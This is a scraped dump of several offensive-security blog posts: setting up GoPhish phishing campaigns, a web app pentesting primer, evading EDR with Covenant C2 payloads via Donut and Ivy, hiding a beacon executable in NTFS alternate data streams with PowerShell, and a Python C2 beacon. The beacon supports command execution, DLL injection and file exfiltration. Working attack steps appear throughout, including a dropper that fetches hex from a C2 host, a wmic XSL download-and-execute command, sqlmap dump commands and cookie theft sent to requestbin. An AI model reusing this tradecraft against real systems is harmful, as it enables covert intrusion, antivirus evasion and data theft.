"&nbsp;&nbsp; &nbsp;What is GoPhish?&nbsp;&nbsp; &nbsp;GoPhish is a great platform for launching phishing campaigns on a budget. By simply installing it along with Postfix on a Digitalocean droplet,...", "content": "&nbsp;&nbsp; &nbsp;What is GoPhish?&nbsp;&nbsp; &nbsp;GoPhish is a great platform for launching phishing campaigns on a budget. By simply installing it along with Postfix on a Digitalocean droplet, we can launch phishing campaigns customized to our own needs from the cloud for only a few dollars a month. Compare this to other options like what Microsoft offers, and this all of a sudden becomes a very appealing platform. There's a lot of discussion out across the internet though on the different pro's and cons to utilizing GoPhish. Some teams dislike it because it adds a header on every email identifying itself as GoPhish, some dislike it because it doesn't have robust default options like you would get with a paid solution, and some dislike it because it can be seen as a hacky approach to trying to solve the issue of how to phish users. Coming from more well known pre-configured platforms, I like it for the ability to customize campaigns to what different teams and users are facing company to company. Sure, Microsoft can launch a campaign in five different languages, but rarely do their options represent what I see in the real world.With all this said, let's begin setting up GoPhish!Setup &nbsp;&nbsp;&nbsp; First up is installing Postfix. Postfix is what we will use for sending the actual emails. It's a lightweight opensource platform that pairs very easily with GoPhish. Setup is simple, just run apt-get install postfix. Once Postfix is installed, we want to ensure the mynetworks variable is set to our local home IP.&nbsp;&nbsp;&nbsp;&nbsp; The next step, if you want to receive emails, will be to setup an A record and an MX record. To do so, go to Digitalocean, select the project that this resides under, and then select Networking. From there, go to domains and add a new one. Once this is all set, we can begin setting up the DNS records. We will need an A record that points to our VPS IP and an MX record that points to our domain name.&nbsp;&nbsp;&nbsp;&nbsp; This step is optional though as a lot of phishing campaigns focus on emulating automated emails like password resets or billing invoice documents, so being able to receive emails is less important.&nbsp;&nbsp;&nbsp; Now that Postfix is installed and setup, we can install GoPhish. As of writing this, .12 is the most up to date version. Download it with wget https://github.com/gophish/gophish/releases/download/v0.12.0/gophish-v0.12.0-linux-64bit.zip and then unzip gophish-v0.7.1-linux-64bit.zip &amp;&amp; chmod +x gophish. Now that GoPhish is installed and executable, start it with ./gophish&nbsp;&nbsp;&nbsp; Since the admin panel listens on localhost:3333 by default, and I don't want to open this interface up to the internet, let's create an SSH tunnel with&nbsp; sudo ssh -i &lt;cert&gt; root@&lt;ip&gt; -L3333:localhost:3333 -N -f&nbsp; where &lt;IP&gt; is your Digitalocean VPS IP and &lt;cert&gt; is the certificate you're using for user authentication. Log in and start poking around! There's a lot that we can do here and launching custom phishing campaigns that fit our needs is fairly simple.&nbsp;Starting your first campaign &nbsp;&nbsp; &nbsp;I will provide a simple campaign to test users executing macros on documents that can be expanded to do a lot more if you want. Below is the example macro that will reach out to requestbin with the current username showing who has executed the document.&nbsp;&nbsp;&nbsp; Setting up the campaign in GoPhish's dashboard is very quick. We first need to create a sender profile that we will use to send the document with.&nbsp;&nbsp;&nbsp; What you want to call the profile goes into the name field. The \"From:\" field is where you make your fake sending persona. The \"Host:\" will be the IP of your Postfix server if it's not hosted locally. The Username/Password can be left blank unless you have authentication for your SMTP service turned on. And finally in the \"Email Headers:\" field, we can add custom data to help identify us to spam filters and allow test campaigns through.&nbsp;&nbsp; &nbsp;Then, we need to set up an email template. This is where we will include the document we made above as an attachment along with a convincing message to tell users to open the document and enable the macro to run.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; There's a nifty trick for creating templates where you can import a saved email that you want to emulate or that you often see users receive. Otherwise, fill in the subject and body with what you think will test your users well and attach the file. Something important to remember, do not make phishing campaigns too good. Emulating common services that your teams use can have the opposite affect from what was intended and cause them to be overly suspicious now of legitimate day to day emails. There are things that should be off limits too like pretending to be the executive team and offering COVID bonuses for people struggling. Yeah, you will probably get someone desperate enough to click and execute, yeah the criminals are not above doing this. But you won't develop a good relationship with the rest of the company and users will grow to resent the security team if that's how you go about testing." }, { "title": "A Beginners Guide To Everything WebApp Pentesting", "url": "/posts/a-beginners-guide-to-webapp-pentesting/", "categories": "", "tags": "", "date": "2022-07-27 02:18:00 +0000", "snippet": "So you want to be a pentester&nbsp;&nbsp;&nbsp; There's a ton of different types of pentesting that you can do. What we'll talk about here though is website pentesting. This is the type of pentesti...", "content": "So you want to be a pentester&nbsp;&nbsp;&nbsp; There's a ton of different types of pentesting that you can do. What we'll talk about here though is website pentesting. This is the type of pentesting that will help developers secure websites that you and other people, potentially globally, will have access to so it's pretty important. But there are a lot of ways to remove any of the value that it can bring project owners. Some testers for instance will only use automated tools and don't understand the output that they generate and just hand over a report. This is unhelpful because as a pentester it's your duty to know why vulnerabilities appear on Burp and how to resolve them. Building off of that, as well as knowing the vulnerabilities, you should understand any solutions you offer and avoid canned suggestions. Today we will review the necessary prep work, what tools to use, common vulnerabilities to look for, and how to put it together in a report. This post is intended for people who are new to web app pentesting or those who want to know whats needed at a semi technical level in order to succeed. Also note, all demonstrations are either using culbertreport.com or a vulnerable version of OrangeHRM/LotusCMS.The paperwork&nbsp;&nbsp; &nbsp;Before you begin an actual pentest, there are some important items that you need to get out of the way. Of those, permission and scope will be the most important ones. Get a proper scope defined for what URLs are valid, what accounts can be targeted, and what must be explicitly avoided. In the same vein, make sure you have full permission from the web site owners to perform the pentest. Without these, you're treading on thin ice.&nbsp; &nbsp;&nbsp; &nbsp;The typical scope discussion and documentation will tell you that there are numerous URLs like subdir1.staging.culbertreport.com that are in scope, whether or not you're testing the staging environment (and you should really only test there) and whether or not it contains real data - you need to know whether or not the data you may see is potentially real PHI, for example, as there are other liabilities around this and BAA's that need to be signed. You also may or may not be given an account to use and you should also be given a point of contact who controls the webapp environment. This is to be used to relay findings but also in case you get locked out of the testing environment, something gets broken, or an attack accidentally leaks over to production and it needs to be remedied. Tools to use&nbsp;&nbsp;&nbsp; Now that you've gotten the paper work out of the way, what tools do you use? Well there are a ton of tools, both paid and free, out there but really you will be fine with using 3/5 of the below for 99% of your engagements.&nbsp; Burp Suite&nbsp;&nbsp; &nbsp;Tried and true. This is in everyone's tool box because it has 99% of everything you will need in an engagement and, if it doesn't, there's either a plugin already made for it or you can write one for it.&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; For those unfamiliar with the tool, there's a LOT to take in with this screen. The majority of your work will be done in the proxy and the repeater tab. The proxy is where you will either direct your browsers traffic through or launch a custom Chromium instance and see all of the traffic you've generated pass through, and the repeater allows you to send different requests repeatedly while changing whatever parameters you wish to in that request. Other tabs you may use include the sequencer, which will tell you whether or not there are issues with how cookies are generated, and the extender page where you can download extensions like I have for JSON Web Tokens.Burp Suite EnterpriseBurp Enterprise is fantastic for automating the more mundane portions of your engagements and for passively collecting vulnerability details as you work as well as running auditing scans. If your organization can afford an enterprise license, the tools that come with it will make the cost well worth it. Some highlights that are worth noting include the auditing scans to test for every exploit possible against every URL - though it's very important that this is only run against a staging environment that can be broken and you should not rely on this to find everything exploitable. Another highlight is that while you browse the site, Burp will passively note vulnerable components. For instance potentially there was a JS dependency that was missed by your manual investigation.OWASP Zap&nbsp;&nbsp; &nbsp;The lesser known cousin to Burp. It has much the same toolkit but in a slightly different UI. There's not much to say here, it's a cool tool and you can't go wrong using it.&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;If you're coming from Burp, this UI makes far less sense initially. But as you use it, it quickly becomes apparent where the features you've come to expect with Burp hide under, and one bonus is that Zap will do passive enumeration of issues similar to how Burp Enterprise does.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; As well as the passive enumeration, the request editor works much the same was as Burp Suites version, just a slightly different UI.&nbsp;SQLMap&nbsp;&nbsp; &nbsp;If you see SQL errors during an engagement, you can break out SQLMap to see if any of it is truly exploitable. I personally find SQLMap is best used with a valid request taken from Zap or Burp saved to a text file. This way you don't have to spend time messing with authorization parameters to reach the point you want to test. The tool will be demonstrated further below but your typical flow will look like this:&nbsp;sqlmap -r request.txt # SQLMap will figure out what position is exploitable in the request sqlmap -r request.txt --dbs&nbsp; # We then get the different databases sqlmap -r request.txt -D target_DB --tables # Get the tables from the target DBsqlmap -r request.txt -D target_DB -T target_table -dump # Then finally dump the contents of the tableSSLscan&nbsp;&nbsp;&nbsp; &nbsp;This tool, for the most part, is covered by what's provided through Burp Enterprise. But if you don't have one of those licenses, this will be a nice compliment to your toolkit. SSLScan examines encrypted communications, such as HTTPS, and finds all the ciphers that are supported. This is the non flashy side of web app testing. Determining if weak ciphers are in use or if protocols that would be regulatory failings are in use is very important. Common vulnerabilities you'll test for&nbsp;&nbsp;&nbsp; Now that you've got your tools selected and tested, you're going to start wanting to test the website. But what do you look for and why? Do you stick with the OWASP top 10? It's a respectable list but it's not nearly inclusive of everything you should look at. CSRF&nbsp;&nbsp; &nbsp;Cross-site request forgery. An easy one to test for and really important for testers to find attackable examples. This occurs when you are allowed to send requests with the referer field being set to another host. Typically, when you click a function in a site, a request is sent and the referer field tells the site where this is coming from. &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;But with CSRF, this field is not properly validated. For example, see the below request.&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;In the above picture, the referer is set to attacker.com. Why is this bad? Take for example a site that requires admins manually add new users to it. Through testing, you may be able to determine the fields that are expected to sign up a user with but you still don't have the required permissions to add yourself. If you can trick an admin level user into clicking a button on another site that fires off this POST though, and that admin has a currently valid session, all of a sudden you're signed up!&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;An important note, validating the referer field is not the only way to protect against CSRF. There are token based systems that will be more reliable, but these are more complex and simply validating the referer will get you 99.99% of the way there.XSS&nbsp;&nbsp; &nbsp;Cross-site scripting. Everyone's heard of it and everyone looks for it. What is it actually doing though and why is this dangerous?&nbsp; First, there's a few different types of XSS to test for.&nbsp; The most common one I've seen is stored, which is where you enter something like a comment on a site and then any visitors afterwards will be affected.&nbsp;Followed by that is reflected, which is when you send someone a link like https://cr.culbertreport.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt; and upon clicking this link they trigger the alert popup.&nbsp;And finally is DOM. This refers to the document object model and can be thought of similarly to reflected XSS, but they attack two different functions. This one will be by far the most complicated to attack. I really encourage anyone curious to read the OWASP entry as it explains it in the best way possible. This is the only XSS that can be executed in such a way that the server has no idea that the user fell victim to this as well. This is accomplished by using a # in the URI to fragment it and have the XSS be loaded client side by the DOM.&nbsp; &nbsp;&nbsp;&nbsp; What each of these are doing is modifying web pages to have attacker supplied elements due to improper sanitization of supplied input. This can then be leveraged by an attacker to do things like stealing session cookies from users. So with the stored XSS example, we can insert an element to get the document.cookie value from users who browse there and send it off to requestbin.net. This would then let you hijack their sessions and perform actions as those compromised users.&nbsp;&nbsp;&nbsp;&nbsp; The typical protections for this are to escape special characters and sanitize the user input. Escaping in this case means to invalidate potential HTML characters like \"&lt;\" through methods like encoding. Sanitizing would be to strip those special characters entirely from the supplied input. SQLi&nbsp;&nbsp;&nbsp; Another common one. This attack exploits sites that do not properly validate user supplied input before executing SQL queries with it. A common test to do this is to append a ' to the end of every input field and look for the 500 internal error response or a 200 OK that returns the SQL error. What you're doing with this test is starting a string and then not closing it, hence why the server responds with a SQL error. This can be leveraged either manually or automatically with SQLMap to then do things like dump database contents or pop a shell.&nbsp;&nbsp;&nbsp; There are a number of protections against SQL injection ranging from using prepared statements to what we did with XSS and try to escape the supplied input and treat it as a string. They each have pros and cons and it's important to remember that no solution is perfect.&nbsp; Directory traversal&nbsp;&nbsp;&nbsp; This occurs when attackers can access files outside of the web sites root directory. You typically see this with people putting a series of '../' into the URL hoping to escape as this gets interpreted by the web server sometimes as user input to move up a directory.&nbsp;&nbsp; &nbsp;Protecting against this is typically equally as simple as the attack itself. First, ensure that user input is valid and remove unexpected characters. Then second, when processing resource requests, append the requested path to the folders canonical path. This will ensure that any requests stay inside the websites root directory.User account takeover&nbsp;&nbsp;&nbsp; This is important to test for as it could allow another bigger issue, privilege escalation. This typically takes advantage of the password reset function. Often times, this function uses your cookie to identify who you are and whose password to reset. But sometimes the application passes a user ID to the back-end which can then be modified allowing the attacker to take over another users account.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This falls under broken access control - a user should only have access to their own resources and so any requests like this need to be validated against their permissions. If proper validation were in place, the back-end would see this request and see that the requested user ID to edit did not match the users ID or permission level and then kick back an error. Privilege escalation&nbsp;&nbsp;&nbsp; Privilege escalation is right behind user account take over because they often use the same method - poor validation on a password reset. Another method is forceful browsing. Sometimes when logging in, the page will return a redirect to the standard user page and this can be modified to point to the admin page instead, allowing elevation of user privileges especially if functions within the admin panel do not do validation on user privilege level. Forceful browsing like this can in some cases take guessing to determine the correct admin page location unless you use a tool like Dirbuster to automate this.&nbsp;&nbsp;&nbsp; Developers should ensure that all requests are validated against the users permission level. Both of these scenarios, forced browsing and accessing other users information, also falls under broken access control.Sensitive information disclosure&nbsp;&nbsp;&nbsp; Web developers often overlook the advantage that these disclosures in error messages can give attackers. You can determine software versions, if something is a SQL back-end, what file types are allowed to be uploaded, and where in your exploitation the server stopped and kicked back an error to name a few.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;In the above example, I've now determined the framework version, the PHP version, and the MySQL version, as well as where errors are logged on the hosting server. This is all sensitive information as I can now look up attacks specific to these version numbers and it really simplifies the exploitation job.&nbsp;&nbsp;&nbsp; &nbsp;Returning errors like this is really handy in development, since it helps pinpoint exactly what is breaking, but in a production environment it gives away too much information. Instead, return generic error pages that only let users know something went wrong or the requested page is missing. Malicious file uploads&nbsp;&nbsp;&nbsp; If a site allows you to upload things like PHP or HTML, this can be leveraged by attackers to perform actions like listing /etc/passwd.&nbsp;&nbsp;&nbsp;&nbsp; This one is overall pretty simple. If you can upload files other than what was intended, that's an issue that needs fixing. Sometimes developers do put filters and only look for image files, but they only look for strings like jpeg in the file name. So if you upload file.jpeg.php, this will bypass their filter.&nbsp;&nbsp;&nbsp; Developers should use an allow list of extensions and avoid deny lists - the possible number of extension is far too much for any one person to keep track of. In addition to this, you should review that the allowed list of extensions only contains the bare minimum of file types needed for your application to function properly.You found a vulnerability, so what?&nbsp;&nbsp; &nbsp;Finding the vulnerability is not the end, your next responsibility is helping the client and developers fix the issues. Understanding what goes into fixing these issues is absolutely an important skill for quality pentesters to have. &nbsp;&nbsp; &nbsp;There's no shame in looking up the vulnerability on OWASP and finding a suggested solution there, but you should definitely understand why that solution works in the supplied example and be prepared for developer use cases to veer from the recommendations. Also be prepared for company priorities to shift and your finding to be downgraded. Just because OWASP says it's a high doesn't mean that your client or development team will feel the same way and ultimately it's their issue to deal with how they want.&nbsp;&nbsp;&nbsp;&nbsp; Take for example SQL injection. This is a common vulnerability to encounter and OWASP has a number of suggestions for protecting against it, so which should you pick? You have prepared statements, stored procedures, allow list input validation, and escaping all user supplied input. They each have pros and cons. For instance, escaping user supplied input assumes that you are actually catching all escape attempts. On the other hand, prepared statements are generally thought of as being able to stop SQL injection attempts against the parser, but it still leaves things like logging who writes what and user defined triggers vulnerable to SQL injection. Not to mention some people join supplied input strings to create prepared statements which defeats the purpose. There are a lot of ways that attempting to solve an issue can actually open you up to further damage, so understanding the environment and the solutions you will suggest is critical.Writing your report&nbsp;&nbsp;&nbsp; This can vary organization to organization, but typically this will include a high level discussion of the issues detected, their impact, and a total count of all the detected vulnerabilities followed by a table of each and supporting evidence. You should sort the detected vulnerabilities from high to low so that important issues catch the readers attention early and include clear steps for how to reproduce the detected issues to make developers lives easier. The faster the developers can see it in action, the faster they can determine where a fix needs to be placed and get it rolled out to staging.&nbsp;&nbsp;&nbsp; &nbsp;The high level discussion allows you to outline vulnerabilities that you thought were of note and discuss their potential impact if left unpatched. Getting across the right amount of urgency is crucial as too little will result in people leaving gaping holes while too much makes them treating future findings much more lightly then maybe they should. Think about the potential impact to client and customer data or reputational impact in order to judge how critical it is that something be patched in a week or in 90 days.&nbsp;&nbsp;&nbsp; Adding as much detail in the client facing report will reduce frustration on both ends as the developers can begin implementing fixes and the testers can focus on other work that needs to be done. Make sure you have your target audience in mind too when writing this, as going to technical will result in misunderstandings but leaving it too high level will have the report receivers scratching their heads figuring out the exact thing you meant. And that's it!&nbsp;&nbsp; This is what it takes at a basic level to be a competent pentester. Writing detailed reports and working with developers will be more than half your job. This is not a position where you can succeed by not working with others and especially be prepared to work with developers who are completely unfamiliar with working within a security context. Have sympathy as it's not their realm of expertise and they brought you in specifically to help them shore up this area. You can also learn a great deal from them on architecture and design philosophy." }, { "title": "Covenant In 2022", "url": "/posts/covenant-in-2022/", "categories": "", "tags": "", "date": "2022-06-07 21:38:00 +0000", "snippet": "Intro&nbsp;&nbsp;&nbsp; What great timing, s3cur3th1ssh1t just made a post on stageless vs staged Grunts in Covenant. Check it out! A quick background before diving in. What is Covenant? Covenant i...", "content": "Intro&nbsp;&nbsp;&nbsp; What great timing, s3cur3th1ssh1t just made a post on stageless vs staged Grunts in Covenant. Check it out! A quick background before diving in. What is Covenant? Covenant is one of the easiest post exploitation frameworks to spin up. It uses .NET, which is a just-in-time compiled language, to generate \"grunts\" that connect back to the C2 in order to receive commands. The commands can be received either through PUSH or PULL methods depending on how you want the network traffic to look and the traffic can be further obfuscated through header modification, among other methods, by playing with different profiles. Covenant makes it simple to change almost every aspect of how commands are fetched. In this write up though, we will focus primarily on customizing our grunt delivery.How Do The Grunts Hold Up?&nbsp;&nbsp;&nbsp; Generating simple grunts with Covenant out of the box is quick and modification of their underlying code is fairly easy. There are a few Python scripts to obfuscate common strings in the grunt code (such as removing the term \"grunt\") and that comes in very handy. Moreover, once you've customized a grunt, you can save that as a template so that you won't need to repeatedly obfuscate strings. The framework has built in tools to generate payloads in many forms such as XSL stylesheets, b64 encoded Powershell commands, and Donut encrypted shellcode - more on that last one later.&nbsp;&nbsp;&nbsp; All that said, it will take work on the operators part in order to succeed with getting execution off. Where previously you could just generate a payload from the dashboard and get away with sending it to users, now you would get caught immediately.&nbsp;&nbsp;&nbsp;&nbsp; Naturally, your next question might be \"Is Covenant still worth using?\" And the answer is a resounding yes! There are far more interesting options that we can use than just a plain old executable and we'll explore some of them below.Built-in Evasion Options?&nbsp;&nbsp;&nbsp; Covenant has many options for evasive grunts, giving attackers a wide range of tools. As mentioned previously, Donut can generate shellcode to run our grunts, operators can output a grunt in the form of an XSL style-sheet and use wmic os get /FORMAT:\"https://url\" to download and execute it, or you can use DotNetToJScript to generate a grunt to be used in a number of ways like Microsoft HTML application (MSHTA) payloads.&nbsp;&nbsp;&nbsp; &nbsp;Covenant evidently has some well thought out evasion options built into it. It's worth reviewing Donut specifically though for a moment since we'll utilize it below. A key feature is that Donut allows in memory execution of shellcode. Specifically, this shellcode is going to be position independent so that it can be executed from anywhere. How this works at a super high level is that once the grunt is executed, Donut sets up a new application domain meant to run the .NET assembly, shellcode gets loaded into there, and then finally executed. Hiding The Grunts&nbsp;&nbsp;&nbsp; Covenant has been around for a long time at this point. There have been quite a few people who have developed different tactics throughout the years that have evaded antivirus. But in 2022 a lot of these don't hold up nearly as well. In 2021/2022, we saw a great advance in EDR's ability to detect malicious actions in files and in memory. There are three techniques for running the Donut shellcode that hold up relatively well despite these advances in detection and below we'll review how they work.DLL Proxy Loading&nbsp;&nbsp; &nbsp;This method is the least effective out of the three, but least effective doesn't it won't work and it's up against some stiff competition. What this method does is read in the shellcode.bin file and then use VirtualAlloc to allocate a memory region before copying the shellcode contents into it using memcpy. A simple but effective solution.&nbsp;&nbsp;&nbsp; &nbsp;A lot of EDR/AV had trouble identifying and scanning the shellcode file generated through Donut. But this method has the drawback of needing to drop the DLL and the shellcode seperately, as opposed to just one application or file. Redteaming.co.uk has a great right up though on doing this here. If you would like to use this technique, it's advised you use a staged dropper to facilitate retrieving both the needed shellcode and the DLL as well as executing the DLL once both are downloaded.Hiding Shellcode in the .RSRC Section&nbsp;&nbsp; &nbsp;Another method for getting the aforementioned shellcode onto the victims system is to generate the shellcode bin and then add it to an applications resource section. This is a common technique that offensive security programmers use to hide their payloads and it's not unique to Covenant. Once added here, we can extract the grunt from the invalid ico file and allocate it to memory and execute! Find a more detailed write up on this here.&nbsp;&nbsp;&nbsp; &nbsp;This technique works great for payloads since this is contained within one file. Getting this onto a system can be accomplished either through a staged or stageless dropper since the grunt is only one file and it's a simple executable that a user can start.&nbsp;Evasion With Ivy&nbsp;&nbsp;&nbsp; The third method for evasion, and it's one of my favorites. Ivy is a payload generation tool developed by Optiv. If you haven't heard of it before, you should read more about it here. Basically though, Ivy takes shellcode, encrypts it, and then and executes it in memory. Ivy accomplishes this by spawning a hidden Excel process and loading the encrypted payload strings into a VBA function. It comes with a number of options for evasion built in like breaking up lines into chunks (so that no one line can be determined to be anything but random characters) and an EDR unhooking mode that builds it's own version of WriteProcessMemory. We can couple Ivy with Covenants ability to generate a Donut payload and find a lot of success in evading modern AV. One small drawback though is that we do need the victim to have Office installed.&nbsp;&nbsp;&nbsp; Generating a payload is super simple. You have options for either staged or stageless, remote process injection or local execution, and a number of different delivery options. Below is a simple example of generating a stageless payload with the Donut bin that Covenant output. &nbsp;&nbsp;&nbsp; The generated payloads see a big drop in both attribution and detection rates when compared to the bin that we embedded inside of it.&nbsp;&nbsp;&nbsp; &nbsp;Executing the Ivy payload is equally as simple, the user just needs to double click it. Windows will execute it with the script host and then the grunt will check in.&nbsp;Lessons Learned &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; It should be evident by now that Covenant can still be used quite effectively in 2022. Covenant comes with a feature rich interface that is really nice to see in a free and open source platform and it is very simple and quick to modify grunts. In this post, we have reviewed three techniques for running grunts that can evade modern EDR/AV. The grunts we developed only utilized the built-in Donut generator, so there is still plenty left to explore with the other launcher options.&nbsp;&nbsp; &nbsp;This was part one of, hopefully, a multipart series. Next up should be what covenant looks like on the wire and how we can combine user agents and message transformation rules with custom protocols to truly blend in and hide with normal traffic on the wire." }, { "title": "Hiding In Alternate Data Streams", "url": "/posts/hiding-in-alternate-data-streams/", "categories": "", "tags": "", "date": "2022-05-05 18:20:00 +0000", "snippet": "&nbsp;&nbsp; &nbsp;While reading Gray Hat Python, I came across another interesting tactic of hiding files in what's known as alternate data streams. I had previously seen this used by Microsoft to...", "content": "&nbsp;&nbsp; &nbsp;While reading Gray Hat Python, I came across another interesting tactic of hiding files in what's known as alternate data streams. I had previously seen this used by Microsoft to tag files downloaded from the internet with MOTW in the Zone.Identifier so that macros don't execute, and I've seen it used to hide simple txt files inside of another.&nbsp;&nbsp;&nbsp; Gray Hat Python though was using an ADS to hide a full on executable. This seemed like a nifty way to bypass detection since it didn't change the file hash but I had trouble maintaining the ADS when copying the file to another victim machine. This is a common issue. The workaround that I came up with was to convert the executable that I want to hide into bytecode, serve it on a simple HTTP server, then have the victim machine write the code to disk in an invalid format to evade detection before moving it into an ADS. I found a handy tip on Stackoverflow to do just this.&nbsp;&nbsp;&nbsp; &nbsp;First up, on our C2, we must get the bytes content of our executable.[byte[]]$data = [System.IO.File]::ReadAllBytes('.\\Desktop\\beacon.exe')&nbsp;&nbsp;&nbsp; &nbsp;Then, we write the contents of this data to index.html intending to serve this with Pythons simple HTTP server.[System.IO.File]::WriteAllText('index.html',[System.BitConverter]::ToString($data).Replace('-',''), [System.Text.Encoding]::ASCII)&nbsp;&nbsp; &nbsp;After this, just ensure port 8000 is accessible on your machine and start your Python server in the same directory.&nbsp;&nbsp; &nbsp;Now, on our compromised host, the dropper script.&nbsp;&nbsp; &nbsp;Our dropper first runs invoke-restmethod which, similar to invoke-webrequest, does a GET to a webpage but only retrieves the content and not the meta data or anything else. A cool feature as well of restmethod is that it will automatically parse any Json retrieved.invoke-restmethod 'http://c2.culbertreport.com:8000' | Tee-Object -Variable hex&nbsp;&nbsp; &nbsp;Then, once we have the hex downloaded, we write it to disk with an invalid file extension. This is just to help it evade detection before we move it into an ADS.[System.IO.File]::WriteAllBytes('C:\\users\\public\\ht.html', ($hex -split '(.{2})' -ne '' -replace '^', '0X')) &nbsp;&nbsp; &nbsp;After it's been written to disk, we then move it into a files alternate data stream and finally give it a valid file extension of .exe.&nbsp;&nbsp;&nbsp; &nbsp;To do this, the first attempt used a Python script taken from Gray Hat Python. But we should be able to accomplish the same thing with Powershell. There are many sources I found that were adding data to an ADS, but they all were along the lines of type beacon.exe &gt; filepath\\goodfile.txt:beacon.exe. This was causing issues because now Powershell only expects one semicolon in the path. I found this source which was adding calc.exe to an ADS. So, following along and using Set-Content, we can add the bytestream of our downloaded file to an ADS:set-content -path .\\newfile.txt -value $(Get-Content ht.html -readcount 0 -encoding byte) -encoding byte -stream beacon.exe &nbsp;&nbsp; &nbsp;And finally, we have it working!&nbsp;&nbsp; &nbsp;These streams can be found using the Get-Item command." }, { "title": "Switchblade To Swiss Army Knife: Expanding The Toolset With Python", "url": "/posts/switchblade-to-swiss-army-knife-adding/", "categories": "", "tags": "", "date": "2022-04-25 17:41:00 +0000", "snippet": "Intro &nbsp;&nbsp; &nbsp;A while ago I posted about Switchblade. This was a C2 technique that utilized mutual TLS to authenticate beacons that were compromised and separate them out from other traf...", "content": "Intro &nbsp;&nbsp; &nbsp;A while ago I posted about Switchblade. This was a C2 technique that utilized mutual TLS to authenticate beacons that were compromised and separate them out from other traffic. I won't rehash it too much but it was a cool (in my opinion) way to use Nginx to authenticate beacons with an unusual method and would be considered zero trust since the beacon authenticated to the server and the server authenticated to the beacon.&nbsp;&nbsp;&nbsp; Since then, some stuff has changed and some stuff has been updated. Find the details here. Mainly, things could be done easier if the beacon did away with just a simple shell. So the beacon was changed to perform a GET request to the C2 which would have some response options. You can download a file or upload a file, you can inject a DLL into a process, or you can run a command such as cmd.exe or notepad.exe or calc.exe. Limitless potential!&nbsp;&nbsp;&nbsp; Let's review the code that's driving this.The Code DLL Injection&nbsp; &nbsp;&nbsp;&nbsp; DLL injection is somewhat confusing to a lot of people. They can be used to do a lot of things, but the main purpose is to manipulate programs to change how they execute. For example, KeyFarce is a DLL to dump the unlocked contents of a KeePass database. The code used in the beacon for DLL injection was taken from Grayhat Python and slightly adapted for our needs. &nbsp;&nbsp;&nbsp; The only change that we made to the original was that we start a new process and get it's PID instead of injecting into our own main process. The idea behind this is that if injecting the DLL causes the process to crash, at least our beacon won't crash.&nbsp;&nbsp;&nbsp; Some may be wondering what these flags set at the start of the function are. More can be found in this Microsoft documentation, but the summary is that PAGE_READWRITE allows us to write to this section of \"pages\" and pages can be thought of as a virtual section of memory. Then PROCESS_ALL_ACCESS gives you rights to the whole process. Finally, the way the VIRTUAL_MEM flag is set allows us to reserve and commit a space of virtual memory in one go.&nbsp;&nbsp;&nbsp; This function is called with:&nbsp;&nbsp;&nbsp; inject;{dll name}; nullCommand Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Executing commands on another host is the most basic principle of a beacon. We need this functionality to enumerate the domain, determine our IP, move files around, add users, etc.&nbsp;&nbsp; &nbsp; Subprocess was chosen over Os.System because it executes commands in the context of a new process which makes some detection more challenging. Os.System just forks a new child process for each command making it much easier to trace back the parent calling. This can be seen if you look in your EDR at the execution chain comparing Os.System to subprocess. Os.System can be traced back to Python calling it while subprocess only shows that the command was run.&nbsp;&nbsp; &nbsp;The original intent with using subprocess was to use the DETACHED_PROCESS flag which makes our new process not inherit the parents console. The idea was that this would then start a new process which would not have a parent. This can be seen below.&nbsp;&nbsp; &nbsp;The parent is defined as Non-existent process. Cool right? Using the OS library cannot accomplish anything similar to this as far as I'm aware. The DETACHED_PROCESS flag causes issues though when issuing commands like \"ipaddress\" or \"whoami\" so the final version we see here has that removed.&nbsp;&nbsp;&nbsp;&nbsp; Below is an example of our beacon running \"pwd.\" The EDR was able to determine that the process \"cmd.exe\" had called it with the \"/C\" flag set, and if we scroll over we can see there is a parent process identifying our beacon.&nbsp; &nbsp;&nbsp;&nbsp; \"pwd\" however isn't an inbuilt tool on Windows. This was downloaded and added to the path. Running something like \"whoami\" produces very different results.&nbsp;&nbsp;&nbsp; Unlike with the previous command, there is no parent calling process immediately linked, despite both examples being run the same way. The EDR does give us a parent PID, but we have to query that separately to find out what the parent truly was. To a quick glance, both of the \"whoami\" being run just look like a standard query being run by the user when one of them was actually run by our beacon.&nbsp;&nbsp;&nbsp; This command is called with:&nbsp;&nbsp;&nbsp; cmd;{command to run}; nullFile Download &nbsp;&nbsp;&nbsp; Downloading files to a compromised end point is critical. We can add functionality by downloading different DLLs like KeyFarce or we can update the beacon with new features or signatures.&nbsp;&nbsp;&nbsp; Here, we just do a GET to the URL and then write the contents. We need to include the file extension for when we save it.&nbsp;&nbsp;&nbsp; This command is called with:&nbsp;&nbsp; &nbsp;download;{url};{file extension} Uploading Files &nbsp;&nbsp; Exfiltrating information is also a critical function to have. Let's say you use KeyFarce to dump the KeyPass contents, how are you planning on retrieving that?&nbsp;&nbsp; &nbsp;With this function, we get a file path and an upload URL, read it in binary format since that allows requests to determine the Content-length header, and then send it off to the URL.&nbsp;&nbsp;&nbsp; This command is called with:&nbsp;&nbsp; &nbsp; upload;{url};{file to upload]The Brains&nbsp;&nbsp;&nbsp; Finally, the brains of the beacon. &nbsp;&nbsp;&nbsp; The beacon does a GET to the C2 URL and splits the response on semicolons. There are four options pre built in. Cmd, inject, download, and upload. Each command calls their respective function that we reviewed above. For testing purposes, we are posting to httpbin.org/post which helps illustrate how the data is sent.&nbsp;&nbsp;&nbsp; The mTLS is performed in the GET request every time it is used. We just need the client cert, key, and the CA cert file loaded either locally on Linux or into the cert chain on Windows.Why GET Requests?&nbsp;&nbsp;&nbsp; A series of GET requests may not be the most graceful way of retrieving commands from our controller, but it does hide itself well among the typical internet traffic you might see. We have changed the user-agent as well to appear more like normal internet traffic, stealing the one FireFox uses. The overall beacon design is very flexible as well. If you don't care about getting responses back, you can just set up a simple web page for commands to be retrieved from and put Nginx in 